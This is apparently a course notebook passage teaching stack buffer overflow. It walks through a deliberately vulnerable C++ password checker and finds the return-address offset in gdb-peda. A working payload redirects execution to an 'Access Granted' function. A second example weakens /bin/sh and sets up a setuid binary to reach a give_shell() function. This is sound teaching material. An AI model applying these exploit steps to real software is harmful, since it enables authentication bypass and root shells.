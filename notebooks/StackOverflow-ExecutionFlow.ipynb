{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow - Execution Flow Corruption\n",
    "- overrun in stack segment may lead to corruption in execution flow of the program\n",
    "- violates the integrity of the program itself\n",
    "\n",
    "## program execution flow corruption demo\n",
    "- stack overflow may lead to memory corruption which may lead to the corruption of execution flow\n",
    "- we saw a simple demonstration in memory corruption chapter that memory corrpution can change the unintentional flow of the program where attackers could authenticate without knowing the correct password!\n",
    "- we'll take a step further in this notebook where you'll see that flow of the program can be also be changed by overwriting the caller's return address with the address of attacker's choice "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Execution flow with function call\n",
    "- when a caller calls a function, program execution enters the function and executes each line of code inside function\n",
    "- callee function must return back the execution to its caller once it's done executing\n",
    "- caller pushes return address to the callee's stack, so the callee knows where to return to and continue execution in caller\n",
    "\n",
    "### overwrite the caller's return address\n",
    "- what if the buffer is overflown to corrupt the caller's return address with something else?\n",
    "- if the return address is not valid, program will segfault\n",
    "- if the return address is a valid one, program will execute the code in that controlled return address!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### return to the function/code of user's choice\n",
    "- this technique is fairly straigtforward and just works!\n",
    "- find the address of the function of your choice in the program and overwrite the caller's return address to the controlled function's address\n",
    "- let's use `authenticate3.cpp` program as demonstrataion\n",
    "- parts of the same `authenticate.cpp` program are moved to functions for the demonstration purpose"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd ../demos/stack_overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "#include <cstdlib>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void valid() {\r\n",
      "    cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    cout << \"      Access Granted.\\n\";\r\n",
      "    cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "}\r\n",
      "\r\n",
      "void invalid() {\r\n",
      "    cout << \"\\nAccess Denied.\\n\";\r\n",
      "    cout << \"Try again...\\n\";\r\n",
      "}\r\n",
      "\r\n",
      "int check_authentication(char *password) {\r\n",
      "    char password_buffer[16];\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        return true;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        return true;\r\n",
      "\r\n",
      "    return false;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1]))\r\n",
      "        valid();\r\n",
      "    else\r\n",
      "        invalid();\r\n",
      "        \r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat authenticate3.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"authenticate3.cpp\"\n",
    "output=\"authenticate3.exe\"\n",
    "echo kali | sudo -S ../compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n",
      "Try again...\r\n"
     ]
    }
   ],
   "source": [
    "! ./authenticate3.exe $(python -c 'print(\"A\"*17)')\n",
    "# no auth_flag to overflow, access not granted!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./authenticate3.exe $(python -c 'print(\"A\"*100)')\n",
    "# segfault! see on terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ ./authenticate3.exe $(python -c 'print(\"A\"*100)')~                                                           1 ⨯\n",
    "zsh: segmentation fault  ./authenticate3.exe $(python -c 'print(\"A\"*100)')~\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Program execution and return address\n",
    "\n",
    "- let's load the program in gdb to examine memory address, esp. the caller's return address\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ gdb -q authenticate3.exe                                                              \n",
    "Reading symbols from authenticate3.exe...\n",
    "```\n",
    "\n",
    "- let's set at check_authentication function\n",
    "\n",
    "```bash\n",
    "Reading symbols from authenticate3.exe...\n",
    "gdb-peda$ break check_authentication(char*) \n",
    "Breakpoint 1 at 0x8049271: file ./demos/stack_overflow/authenticate3.cpp, line 20.\n",
    "```\n",
    "\n",
    "- let's run the program with 100 junk bytes (100 A's will do it!) as argument\n",
    "- junk must be large enough to overwrite the return address\n",
    "- let's try with 100 bytes; should be more than enough to overflow 16 bytes password buffer and the return address\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run $(python -c 'print(\"A\"*100)')\n",
    "\n",
    "Starting program: /home/kali/EthicalHacking/authenticate3.exe $(python -c 'print(\"A\"*100)')\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc67b ('A' <repeats 100 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc350 --> 0x2 \n",
    "EDX: 0xffffc384 --> 0x0 \n",
    "ESI: 0xffffc350 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc308 --> 0xffffc338 --> 0x0 \n",
    "ESP: 0xffffc2f0 --> 0x0 \n",
    "EIP: 0x8049271 (<_Z20check_authenticationPc+18>:        sub    esp,0x8)\n",
    "EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x8049263 <_Z20check_authenticationPc+4>:    sub    esp,0x14\n",
    "   0x8049266 <_Z20check_authenticationPc+7>:    call   0x80490f0 <__x86.get_pc_thunk.bx>\n",
    "   0x804926b <_Z20check_authenticationPc+12>:   add    ebx,0x2d95\n",
    "=> 0x8049271 <_Z20check_authenticationPc+18>:   sub    esp,0x8\n",
    "   0x8049274 <_Z20check_authenticationPc+21>:   push   DWORD PTR [ebp+0x8]\n",
    "   0x8049277 <_Z20check_authenticationPc+24>:   lea    eax,[ebp-0x18]\n",
    "   0x804927a <_Z20check_authenticationPc+27>:   push   eax\n",
    "   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2f0 --> 0x0 \n",
    "0004| 0xffffc2f4 --> 0x2 \n",
    "0008| 0xffffc2f8 --> 0xffffc318 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0012| 0xffffc2fc --> 0x80493ed (<_GLOBAL__sub_I__Z5validv()+31>:        add    esp,0x10)\n",
    "0016| 0xffffc300 --> 0x1 \n",
    "0020| 0xffffc304 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0024| 0xffffc308 --> 0xffffc338 --> 0x0 \n",
    "0028| 0xffffc30c --> 0x804934d (<main(int, char**)+126>:        add    esp,0x10)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 1, check_authentication (password=0xffffc67b 'A' <repeats 100 times>)\n",
    "    at ./demos/stack_overflow/authenticate3.cpp:20\n",
    "20          strcpy(password_buffer, password);\n",
    "```\n",
    "\n",
    "- enter next or n to execute next instruction; keep entering next and stop when the instruction: **strcpy(password_buffer, password);** is exectued\n",
    "- the **password** passed to the function will have been copied to **password_buffer** local variable\n",
    "\n",
    "```bash\n",
    "gdb-peda$ n\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc6d0 ('A' <repeats 15 times>)\n",
    "EDX: 0xffffc345 ('A' <repeats 15 times>)\n",
    "ESI: 0xffffc350 (\"AAAA\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc308 ('A' <repeats 76 times>)\n",
    "ESP: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "EIP: 0x8049283 (<_Z20check_authenticationPc+36>:        sub    esp,0x8)\n",
    "EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x804927a <_Z20check_authenticationPc+27>:   push   eax\n",
    "   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>\n",
    "   0x8049280 <_Z20check_authenticationPc+33>:   add    esp,0x10\n",
    "=> 0x8049283 <_Z20check_authenticationPc+36>:   sub    esp,0x8\n",
    "   0x8049286 <_Z20check_authenticationPc+39>:   lea    eax,[ebx-0x1f86]\n",
    "   0x804928c <_Z20check_authenticationPc+45>:   push   eax\n",
    "   0x804928d <_Z20check_authenticationPc+46>:   lea    eax,[ebp-0x18]\n",
    "   0x8049290 <_Z20check_authenticationPc+49>:   push   eax\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "0004| 0xffffc2f4 ('A' <repeats 96 times>)\n",
    "0008| 0xffffc2f8 ('A' <repeats 92 times>)\n",
    "0012| 0xffffc2fc ('A' <repeats 88 times>)\n",
    "0016| 0xffffc300 ('A' <repeats 84 times>)\n",
    "0020| 0xffffc304 ('A' <repeats 80 times>)\n",
    "0024| 0xffffc308 ('A' <repeats 76 times>)\n",
    "0028| 0xffffc30c ('A' <repeats 72 times>)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "22          if(strcmp(password_buffer, \"brillig\") == 0)\n",
    "```\n",
    "\n",
    "- return address is always stored at EBP+4, so let's see that location\n",
    "\n",
    "```bash\n",
    "gdb-peda$ p $ebp+4\n",
    "$1 = (void *) 0xffffc30c\n",
    "```\n",
    "\n",
    "- now the 100As are copied to the password_buffer, let's examine 40 word bytes from top of the stack\n",
    "- 40w = 160 bytes that should display the location of caller's return address!\n",
    "- notice a bunch of Ox41 = A that are stored in stack\n",
    "\n",
    "```bash\n",
    "gdb-peda$ x/40wx $esp\n",
    "0xffffc2f0:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc300:     0x41414141      0x41414141      0x41414141      0x41414141 <- return address & 0xffffc30c\n",
    "0xffffc310:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc320:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc330:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc340:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc350:     0x41414141      0xffffc300      0xffffc400      0xffffc384\n",
    "0xffffc360:     0xffffc394      0xf7ffdb40      0xf7fcbd10      0xf7de6000\n",
    "0xffffc370:     0x00000001      0x00000000      0xffffc3d8      0x00000000\n",
    "0xffffc380:     0xf7ffd000      0x00000000      0xf7de6000      0xf7de6000\n",
    "```\n",
    "- let's continue to the end of the program with c command\n",
    "\n",
    "```bash\n",
    "gdb-peda$ c\n",
    "Continuing.\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0 \n",
    "EBX: 0x41414141 ('AAAA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "ESI: 0xffffc350 (\"AAAA\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41414141 ('AAAA')\n",
    "ESP: 0xffffc310 ('A' <repeats 68 times>)\n",
    "EIP: 0x41414141 ('AAAA')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41414141\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc310 ('A' <repeats 68 times>)\n",
    "0004| 0xffffc314 ('A' <repeats 64 times>)\n",
    "0008| 0xffffc318 ('A' <repeats 60 times>)\n",
    "0012| 0xffffc31c ('A' <repeats 56 times>)\n",
    "0016| 0xffffc320 ('A' <repeats 52 times>)\n",
    "0020| 0xffffc324 ('A' <repeats 48 times>)\n",
    "0024| 0xffffc328 ('A' <repeats 44 times>)\n",
    "0028| 0xffffc32c ('A' <repeats 40 times>)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41414141 in ?? () <--------------------- 0x41414141 == AAAA\n",
    "```\n",
    "\n",
    "- since the caller's return address (0xffffc30c) is overwritten with AAAA, program crashes with segfault"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Finding the offset\n",
    "\n",
    "- knowing the exact offset will help us overwrite the caller's return address with our controlled return address\n",
    "- let's use gdb-peda for this!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ gdb -q authenticate3.exe                                 \n",
    "Reading symbols from authenticate3.exe...\n",
    "```\n",
    "\n",
    "- create cyclic pattern of 100 bytes\n",
    "- pattern should be large enough to overwrite the return address and crash the program\n",
    "- we know that 100 bytes will do the job as demonstrated above!\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 100\n",
    "'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'\n",
    "```\n",
    "\n",
    "- let's create and store the pattern as argument to the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern arg 100\n",
    "Set 1 arguments to program\n",
    "```\n",
    "\n",
    "- let's run the program with the cyclic pattern as argumen\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run\n",
    "\n",
    "Starting program: /home/kali/EthicalHacking/authenticate3.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0 \n",
    "EBX: 0x41412d41 ('A-AA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc2f0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "ESI: 0xffffc350 (\"6AAL\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x44414128 ('(AAD')\n",
    "ESP: 0xffffc310 (\"A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "EIP: 0x413b4141 ('AA;A')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x413b4141\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc310 (\"A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0004| 0xffffc314 (\"EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0008| 0xffffc318 (\"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0012| 0xffffc31c (\"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0016| 0xffffc320 (\"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0020| 0xffffc324 (\"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0024| 0xffffc328 (\"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0028| 0xffffc32c (\"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x413b4141 in ?? ()\n",
    "```\n",
    "\n",
    "- program crashed!\n",
    "- let's search the pattern for offset using `pattern search` command\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts  # pattern search\n",
    "\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 20\n",
    "EBP+0 found at offset: 24\n",
    "EIP+0 found at offset: 28 <- !this is the offset! + 4b will overwrite return add\n",
    "Registers point to pattern buffer:\n",
    "[EDX] --> offset 0 - size ~100\n",
    "[ESP] --> offset 32 - size ~68\n",
    "[ESI] --> offset 96 - size ~4\n",
    "Pattern buffer found at:\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc2f0 : offset    0 - size  100 ($sp + -0x20 [-8 dwords])\n",
    "0xffffc689 : offset    0 - size  100 ($sp + 0x379 [222 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7e62d2c : 0xffffc2f0 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffc2d0 : 0xffffc2f0 ($sp + -0x40 [-16 dwords])\n",
    "0xffffc2e0 : 0xffffc2f0 ($sp + -0x30 [-12 dwords])\n",
    "0xffffc3f8 : 0xffffc689 ($sp + 0xe8 [58 dwords])\n",
    "```\n",
    "\n",
    "- let's run the program in gdb with 28 As + 4 Bs\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run $(python -c 'print(\"A\"*28+\"BBBB\")')\n",
    "\n",
    "gdb-peda$ run $(python -c 'print(\"A\"*28+\"BBBB\")')\n",
    "Starting program: /home/kali/EthicalHacking/authenticate3.exe $(python -c 'print(\"A\"*28+\"BBBB\")')\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0 \n",
    "EBX: 0x41414141 ('AAAA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc340 ('A' <repeats 28 times>, \"BBBB\")\n",
    "ESI: 0xffffc3a0 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41414141 ('AAAA')\n",
    "ESP: 0xffffc360 --> 0xffffc600 --> 0x4 \n",
    "EIP: 0x42424242 ('BBBB')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x42424242\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc360 --> 0xffffc600 --> 0x4 \n",
    "0004| 0xffffc364 --> 0xffffffff \n",
    "0008| 0xffffc368 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0012| 0xffffc36c --> 0x80492e7 (<main(int, char**)+24>: add    ebx,0x2d19)\n",
    "0016| 0xffffc370 --> 0x2 \n",
    "0020| 0xffffc374 --> 0xffffc444 --> 0xffffc693 (\"/home/kali/EthicalHacking/authenticate3.exe\")\n",
    "0024| 0xffffc378 --> 0xffffc450 --> 0xffffc6e0 (\"COLORFGBG=15;0\")\n",
    "0028| 0xffffc37c --> 0xffffc3a0 --> 0x2 \n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x42424242 in ?? () <----- BBBB can't return to the invalid BBBB address\n",
    "```\n",
    "- so we've determined that 28 bytes of junk will get us to the location where caller's return address is stored\n",
    "- now instead of overwriting the return address with BBBB, how about we find some interesting functions' address!\n",
    "- use **nm** to find the addresses of all the symbols"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "08049196 T _Z5validv\r\n",
      "080491f9 T _Z7invalidv\r\n"
     ]
    }
   ],
   "source": [
    "! nm authenticate3.exe | grep valid"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# how about **valid** function?\n",
    "# must use: sys.stdout.buffer.write to print memory addresses and binary data!\n",
    "! ./authenticate3.exe $(python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*28 + b\"\\x96\\x91\\x04\\x08\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we forced the execution flow of the program to return to **valid()** and execute it instead of the **invalid()** for wrong password!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## One more example\n",
    "\n",
    "- let's look at the `so_stdio.cpp` program that has a `give_shell()` function that's not called anywhere in the program\n",
    "- when bad function is done executing, the program should execute cout statement in **main()** printing 'Good bye!'\n",
    "- since, **bad()** has overflow vulnerability (can you see where?), we can overflow **buffer** and overwrite the caller's return address with the address of **give_shell()**\n",
    "- let's see how we can achieve that"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Configuring /bin/sh\n",
    "\n",
    "- in recent Linux, /bin/sh symbolic link points to the /bin/dash shell\n",
    "- **dash** and **bash** programs have implemented security countermeasure that prevents itself from being executed in a Set-UID process\n",
    "    - if they detect being run from Set-UID process, they will drop the effective user ID to the process's real user ID (essentially dropping the privilege)\n",
    "- install **zsh** which Kali already comes with that doesn't have the countermeasure implemented\n",
    "- create a soft link pointing `/bin/sh` to `/bin/zsh`\n",
    "\n",
    "```bash\n",
    "sudo ln -sf file linkName\n",
    "sudo ln -sf /bin/zsh /bin/sh\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see the link\n",
    "! ls -al /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see the file being pointed to\n",
    "! ls -al /bin/zsh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat ./demos/stack_overflow/so_stdio.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " - let's compile the program and execute it\n",
    " - recall that the buffer's address doesn't change as long as the program name length is not changed and no argument is passed to the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/stack_overflow\r\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: so_stdio.cpp: In function ‘char* mgets(char*)’:\n",
      "so_stdio.cpp:29:16: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]\n",
      "   29 |         *ptr = ch;\n",
      "      |                ^~\n",
      "so_stdio.cpp:35:20: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]\n",
      "   35 |         *(++ptr) = ch;\n",
      "      |                    ^~\n",
      "so_stdio.cpp: In function ‘int main(int, char**)’:\n",
      "so_stdio.cpp:51:14: warning: unused parameter ‘argc’ [-Wunused-parameter]\n",
      "   51 | int main(int argc, char *argv[]) {\n",
      "      |          ~~~~^~~~\n",
      "so_stdio.cpp:51:26: warning: unused parameter ‘argv’ [-Wunused-parameter]\n",
      "   51 | int main(int argc, char *argv[]) {\n",
      "      |                    ~~~~~~^~~~~~\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"so_stdio.cpp\"\n",
    "output=\"so_stdio.exe\"\n",
    "echo kali | sudo -S ../compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'print(\"Hello World!\"*20)' | ./so_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# so_stdio.exe has root privilege\n",
    "! ls -al so_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# set effective userid as owner/root\n",
    "! echo kali | sudo -S chmod 4755 so_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# or use symbolic +s / -s\n",
    "! echo kali | sudo -S chmod u+s so_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al so_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### steps to exploit the so_stdio.exe to execute give_shell( )\n",
    "\n",
    "1. find the offset of the return address with respective to the buffer\n",
    "2. find the address of `give_shell()` symbol\n",
    "3. send junk of offset length and the address of `give_shell()` to return to it\n",
    "4. and voila!\n",
    "\n",
    "#### step1: find the offset\n",
    "- we'll use gdb-peda's cyclic pattern for this as shown below\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ gdb -q so_stdio.exe \n",
    "Readinexeg symbols from so_stdio.exe...\n",
    "\n",
    "```\n",
    "\n",
    "- let's create a pattern of 200 bytes (long enough) to overwrite the caller's return address and store it to a file\n",
    "- since, the program gets the data interactively via std I/O, we'll pipe the data from the file when executing the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 200 pattern.txt\n",
    "Writing pattern of 200 chars to filename \"pattern.txt\"\n",
    "```\n",
    "\n",
    "- run the program with the pattern created as standard input\n",
    "\n",
    "```bash\n",
    "\n",
    "gdb-peda$ run < pattern.txt\n",
    "Starting program: /home/kali/projects/SoftwareSecurity/so_stdio.exe < pattern.txt\n",
    "[Thread debugging using libthread_db enabled]\n",
    "Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n",
    "buffer is at 0xffffbd80\n",
    "Give me some text: Acknowledged: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA with length 200\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled off'.\n",
    "\n",
    "Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled on'.\n",
    "\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7e23c40 --> 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:     endbr32)\n",
    "EBX: 0x41416b41 ('AkAA')\n",
    "ECX: 0xf7a1e9b8 --> 0x0 \n",
    "EDX: 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:    endbr32)\n",
    "ESI: 0x6c414150 ('PAAl')\n",
    "EDI: 0xf7ffcb80 --> 0x0 \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffbe10 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffbe10 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffbe14 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
